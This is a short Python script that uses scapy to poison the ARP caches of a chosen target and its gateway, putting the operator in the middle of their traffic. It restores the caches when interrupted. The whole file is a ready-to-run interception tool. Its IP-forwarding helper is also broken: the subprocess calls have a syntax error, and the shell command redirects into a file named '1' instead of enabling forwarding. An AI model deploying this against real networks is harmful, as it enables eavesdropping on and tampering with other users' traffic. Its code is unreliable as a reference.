#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time
import subprocess


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP address")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP address")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an Target IP address , use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify an Gateway IP address, use --help for more info.")
    return options

def forwarding(val):
    if val:
        subprocess.Popen("echo > 1 /proc/sys/net/ipv4/ip_forward", shell=True, subprocess.PIPE)
    else:
        subprocess.Popen("echo > 0 /proc/sys/net/ipv4/ip_forward", shell=True, subprocess.PIPE)



def get_mac(ip):
    response, unresponse = scapy.arping(ip, verbose=False)
    mac = response[0][1].hwsrc
    return mac


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(source_ip, destination_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
counter = 0
forwarding(True)
try:
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        print("\r Send packet: ", counter, end='')
        counter += 2
        time.sleep(2)
except KeyboardInterrupt:
    print("\n [-] Detected  Ctrl + C.... Restored all info. Exit")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    forwarding(False)